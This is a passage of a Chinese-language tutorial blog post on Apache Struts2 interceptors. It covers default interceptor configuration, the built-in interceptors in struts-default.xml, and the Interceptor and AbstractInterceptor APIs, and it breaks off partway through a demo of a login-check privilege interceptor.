未显示指定拦截器，则会使用默认拦截器。反之，若此包中的 Action 显示的指定了某个拦截器，则该默认拦截器将会被屏蔽。此时，如果还想使用默认拦截器，则需要用户手动配置该默认拦截器的引用。</p><p>配置默认拦截器需要使用 <code>&lt;default-interceptor-ref&gt;</code> 元素，此元素为 <code>&lt;package&gt;</code> 元素的子元素。其语法格式如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">"拦截器（栈）的名称"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>在上述语法格式中，name 属性的值必须是已经存在的拦截器或拦截器栈的名称。下面用该语法格式配置一个默认拦截器，示例代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"default"</span> <span class="attr">namespace</span>=<span class="string">"/"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--声明拦截器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"interceptor1"</span> <span class="attr">class</span>=<span class="string">"interceptorClass"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"interceptor2"</span> <span class="attr">class</span>=<span class="string">"interceptorClass"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--定义一个拦截器栈myStack，该拦截器栈中包含两个拦截器和一个拦截器栈--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"myStack"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"defaultStack"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"interceptor1"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"interceptor2"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置包下的默认拦截器，既可以是拦截器，也可以是拦截器栈--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">"myStack"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.LoginAction"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"input"</span>&gt;</span>/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，指定了包下面的默认拦截器为一个拦截器栈，该拦截器栈将会作用于包下所有的 Action。</p><p>注意：每一个包下只能定义一个默认拦截器，如果需要多个拦截器作为默认拦截器，则可以将这些拦截器定义为一个拦截器栈，再将这个拦截器栈作为默认拦截器即可。</p><h2 id="0x03-内建拦截器"><a href="#0x03-内建拦截器" class="headerlink" title="0x03 内建拦截器"></a>0x03 内建拦截器</h2><p>Struts2 框架中内置了许多拦截器，这些拦截器以 name-class 对的形式配置在 struts-default.xml 文件中，其中，name 是拦截器的名称，也就是引用的名字；class 指定了该拦截器所对应的实现。</p><p>只要自定义的包继承了 Struts2 的 struts-default 包，就可以使用包中定义的内建拦截器，否则需要自行定义拦截器。</p><h3 id="内建拦截器的介绍"><a href="#内建拦截器的介绍" class="headerlink" title="内建拦截器的介绍"></a>内建拦截器的介绍</h3><p>在 struts-default.xml 中，每一个拦截器都具有不同的意义，如下表：</p><table><thead><tr><th>名  称</th><th>说  明</th></tr></thead><tbody><tr><td>alias</td><td>在不同请求之间将请求参数在不同名称间转换，请求内容不变</td></tr><tr><td>autowiring</td><td>用于实现 Action 的自动装配</td></tr><tr><td>chain</td><td>让前一个 Action 的属性可以被后一个 Action 访问，现在和 chain 类型的 result() 结合使用</td></tr><tr><td>conversionError</td><td>将错误从 ActionContext 中添加到 Action 的属性字段中</td></tr><tr><td>cookies</td><td>使用配置的 Name 和 Value 指定 Cookies</td></tr><tr><td>cookieProvider</td><td>该类是一个 Cookie 工具，方便开发者向客户端写 Cookie</td></tr><tr><td>clearSession</td><td>用于清除一个 HttpSession 实例</td></tr><tr><td>createSession</td><td>自动创建 HttpSession，用于为需要使用 HttpSession 的拦截器服务</td></tr><tr><td>debugging</td><td>提供不同的调试用的页面展现内部的数据状况</td></tr><tr><td>execAndWait</td><td>在后台执行 Action，同时将用户带到一个中间的等待页面</td></tr><tr><td>exception</td><td>将异常定位到一个画面</td></tr><tr><td>fileUpload</td><td>提供文件上传功能</td></tr><tr><td>il8n</td><td>记录用户选择的 locale</td></tr><tr><td>logger</td><td>输出 Action 的名称</td></tr><tr><td>model-driven</td><td>如果一个类实现了 Model Driven，将 get Model 得到的结果放在 Value Slack 中</td></tr><tr><td>scoped-model-driven</td><td>如果一个 Action 实现了 ScopedModelDriven，则这个拦截器会从相应的 Scope 中取 出 model 调用 Action 的 setModel 方法，将其放入 Action 内部</td></tr><tr><td>params</td><td>将请求中的参数设置到 Action 中</td></tr><tr><td>actionMappingParams</td><td>用于负责在 Action 配置中传递参数</td></tr><tr><td>prepare</td><td>如果 Action 实现了 Preparable，则该拦截器调用 Action 类的 prepare 方法</td></tr><tr><td>staticParams</td><td>将 struts.xml 文件中 <action>标签的参数内容设置到对应的 Action 中</action></td></tr><tr><td>scope</td><td>将 Action 状态存入 session 和 application 范围</td></tr><tr><td>servletConfig</td><td>提供访问 HttpServletRequest 和 HttpServletResponse 方法，以 Map 方式访问</td></tr><tr><td>timer</td><td>输岀 Action 执行的时间</td></tr><tr><td>token</td><td>通过 Token 避免双击</td></tr><tr><td>tokenSession</td><td>和 Token Interceptor 一样，不过双击时把请求的数据存储在 Session 中</td></tr><tr><td>validation</td><td>使用 action-validation.xml 文件中定义的内容校验提交的数据</td></tr><tr><td>workflow</td><td>调用 Action 的 validate 方法，一旦有错谋返回，则重新定位到 INPUT 画面</td></tr><tr><td>store</td><td>存储或者访问实现 ValidalionAware 接口的 Action 类出现的消息、错误和字段错误等</td></tr><tr><td>checkbox</td><td>添加了 checkbox 自动处理代码，将没有选中的 checkbox 的内容设定为 false，而 html 在默认情况下不提交没有选中的 checkbox</td></tr><tr><td>datetime</td><td>日期拦截器</td></tr><tr><td>profiling</td><td>通过参数激活 profile</td></tr><tr><td>roles</td><td>确定用户是否具有 JAAS 指定的 Role，否则不予执行</td></tr><tr><td>annotationWorkflow</td><td>利用注解代替 XML 配置，使用 annotationWorkflow 拦截器可以使用注解，执行流程为 before-execute-feforeResult-after</td></tr><tr><td>multiselect</td><td>检测是否有像 <select> 标签一样被选中的多个值，然后添加一个空参数</select></td></tr><tr><td>deprecation</td><td>当日志级别设置为调试模式（debug）并且没有特殊参数时，在 devMode 模式中，会检查应用程序使用过时或未知的常量，并且显示警告</td></tr></tbody></table><p>Struts2 框架除了提供这些有用的拦截器以外，还定义了一些拦截器栈，在开发 Web 应用时，可以直接引用这些拦截器栈，而无须自定义拦截器。</p><p>注意：随着 Struts2 版本的发展，内建拦截器的数量也在相应地增多，不同版本的 Struts2 拦截器的数量有一些差异，此版本的 Struts2 内建拦截器共有 35 个。这些内建拦截器读者不需要记忆，只需要了解即可。</p><h3 id="内建拦截器的配置"><a href="#内建拦截器的配置" class="headerlink" title="内建拦截器的配置"></a>内建拦截器的配置</h3><p>在 struts-core-2.3.24.jar 包中的根目录下找到 struts-default.xml 文件，打开后找到 <code>&lt;interceptors&gt;</code> 元素下的内建拦截器和拦截器栈，其部分代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"struts-default"</span> <span class="attr">abstract</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--系统内建拦截器部分，上一部分介绍的内容--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"alias"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.interceptor.AliasInterceptor"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"autowiring"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.spring.interceptor.ActionAutowiringInterceptor"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"chain"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.interceptor.ChainingInterceptor"</span>/&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">&lt;!-- 定义Basic stack拦截器栈 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"basicStack"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--引用系统定义的exception拦截器--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"exception"</span>/&gt;</span></span><br><span class="line">            ...</span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">&lt;!-- 定义Sample model -driven stack --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"modelDrivenStack"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--引用系统定义的modelDriven拦截器--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"modelDriven"</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--引用系统定义的basicStack拦截器栈--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"basicStack"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">&lt;!--定义defaultStack拦截器栈--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"defaultStack"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"exception"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"alias"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"il8n"</span>/&gt;</span></span><br><span class="line">            ...</span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"validation"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"excludeMethods"</span>&gt;</span>input,back,cancel,browse<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line">            ...</span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--将defaulrStack拦截器栈配置为系统默认拦截器栈--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">"defaultStack"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--默认action类是ActionSupport--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-class-ref</span> <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.ActionSupport"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述内建拦截器的配置代码中，defaultStack 拦截器组合了多个拦截器，这些拦截器可以满足大部分 Web 应用程序的需求。使用时，只要在 struts.xml 定义包的过程中继承 struts-default 包，那么 defaultStack 拦截器栈就是默认拦截器的引用。</p><p>由于本节篇幅有限，这里没有列出所有的内建拦截器和拦截器栈，读者需要时可以自行查阅 struts-default.xml 文件。</p><h2 id="0x04-自定义拦截器"><a href="#0x04-自定义拦截器" class="headerlink" title="0x04 自定义拦截器"></a>0x04 自定义拦截器</h2><p>在实际的项目开发中，虽然 Struts2 的内建拦截器可以完成大部分的拦截任务，但是，一些与系统逻辑相关的通用功能（如权限的控制和用户登录控制等），则需要通过自定义拦截器实现。</p><h3 id="实现Interceptor接口类"><a href="#实现Interceptor接口类" class="headerlink" title="实现Interceptor接口类"></a>实现Interceptor接口类</h3><p>在 Struts2 框架中，通常开发人员所编写的自定义拦截器类都会直接或间接地实现 com.opensymphony.xwork2.interceptor.Interceptor 接口。Interceptor 接口中的主要代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Interceptor</span> <span class="keyword">extends</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">String <span class="title">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，该接口共提供了以下三个方法。</p><ul><li><strong>void init()</strong>：该方法在拦截器被创建后会立即被调用，它在拦截器的生命周期内只被调用一次。可以在该方法中对相关资源进行必要的初始化。</li><li><strong>void destroy()</strong>：该方法与 init() 方法相对应，在拦截器实例被销毁之前，将调用该方法释放和拦截器相关的资源，它在拦截器的生命周期内，也只被调用一次。</li><li><strong>String intercept（ActionInvocation invocation）throws Exception</strong>：该方法是拦截器的核心方法，用于添加真正执行拦截工作的代码，实现具体的拦截操作，它返回一个字符串作为逻辑视图，系统根据返回的字符串跳转到对应的视图资源。每拦截一个动作请求，该方法就会被调用一次。该方法的 ActionInvocation 参数包含了被拦截的 Action 的引用，可以通过该参数的 invoke() 方法，将控制权转给下一个拦截器或者转给 Action 的 execute() 方法。</li></ul><h3 id="继承AbstractIntercepter抽象拦截器类"><a href="#继承AbstractIntercepter抽象拦截器类" class="headerlink" title="继承AbstractIntercepter抽象拦截器类"></a>继承AbstractIntercepter抽象拦截器类</h3><p>除了实现 Interceptor 接口可以自定义拦截器以外，在实际开发过程中，更常用的一种方式是继承抽象拦截器类 AbstractIntercepter。</p><p>AbstractIntercepter 类实现了 Interceptor 接口，并且提供了 init() 方法和 destroy() 方法的空实现。使用时，可以直接继承该抽象类，而不用实现那些不必要的方法。AbstractInterceptor 类中定义的方法如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInterceptor</span> <span class="keyword">implements</span> <span class="title">Interceptor</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">intercept</span> <span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，AbstractInterceptor 类已经实现了 Interceptor 接口的所有方法，一般情况下，只需继承 AbstractInterceptor 类，实现 interceptor() 方法就可以创建自定义拦截器。</p><p>需要注意的是，只有当自定义的拦截器需要打开系统资源时，才需要覆盖 AbstractInterceptor 类的 init() 方法和 destroy() 方法。与实现 Interceptor 接口相比，继承 AbstractInterceptor 类的方法更为简单。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>自定义拦截器实现权限控制实例。</p><p>新建一个st2test项目。</p><p>配置web.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 首页 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>main.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建User类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username; <span class="comment">// 用户名</span></span><br><span class="line">    <span class="keyword">private</span> String password; <span class="comment">// 密码</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建LoginAction类，用于处理登录逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mi1k7ea.domain.User;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionContext;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ModelDriven;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> <span class="keyword">implements</span> <span class="title">ModelDriven</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8493698886438630994L</span>;</span><br><span class="line">    <span class="keyword">private</span> User user = <span class="keyword">new</span> User();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getModel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获取ActionContext</span></span><br><span class="line">        ActionContext actionContext = ActionContext.getContext();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"admin"</span>.equals(user.getUsername())</span><br><span class="line">                &amp;&amp; <span class="string">"123456"</span>.equals(user.getPassword())) &#123;</span><br><span class="line">            <span class="comment">// 将用户存储在session中</span></span><br><span class="line">            actionContext.getSession().put(<span class="string">"user"</span>, user);</span><br><span class="line">            <span class="keyword">return</span> SUCCESS;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            actionContext.put(<span class="string">"msg"</span>, <span class="string">"用户名或密码错误，请重新登录!"</span>);</span><br><span class="line">            <span class="keyword">return</span> INPUT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建BookAction类，商品处理类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">5640989517690867879L</span>;</span><br><span class="line">    <span class="comment">// 购买图书</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">buy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建拦截器PrivilegeInterceptor类，继承AbstractInterceptor类，在intercept()函数中通过获取session中是否含有user来判断是否已登录再决定是否放行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.interceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.Action;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionContext;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionInvocation;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.interceptor.AbstractInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrivilegeInterceptor</span> <span class="keyword">extends</span> <span class="title">AbstractInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">193664972753450682L</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 得到 ActionContext</span></span><br><span class="line">        ActionContext actionContext = invocation.getInvocationContext();</span><br><span class="line">        <span class="comment">// 获取User对象</span></span><br><span class="line">        Object user = actionContext.getSession().get(<span class="string">"user"</span>);</span><br><span class="line">        <span class="keyword">if</span> (user != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> invocation.invoke(); <span class="comment">// 